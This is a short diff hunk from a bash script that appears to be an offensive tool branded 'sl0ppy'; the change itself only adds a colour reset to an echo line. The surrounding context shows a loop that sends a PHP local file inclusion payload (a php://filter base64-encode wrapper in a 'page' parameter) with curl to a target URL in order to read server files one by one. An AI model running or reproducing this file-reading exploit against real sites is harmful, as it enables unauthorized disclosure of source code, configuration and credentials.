@@ -17,7 +17,7 @@ for filename in ${files[@]};do
   echo -e " $green{ $red sl0ppy $green} $white----$yellow $filename $white----$green{ $red sl0ppy $green}"$white
   curl --silent "$url?page=php://filter/convert.base64-encode/resource=$filename" 
   echo
-  echo -e " $green{ $red sl0ppy $green} $white------$red Sl0ppyr00t $white----------$green{ $red sl0ppy $green}"
+  echo -e " $green{ $red sl0ppy $green} $white------$red Sl0ppyr00t $white----------$green{ $red sl0ppy $green}"$white
 done
 
 file=$(cat sl0ppy-enc.txt)
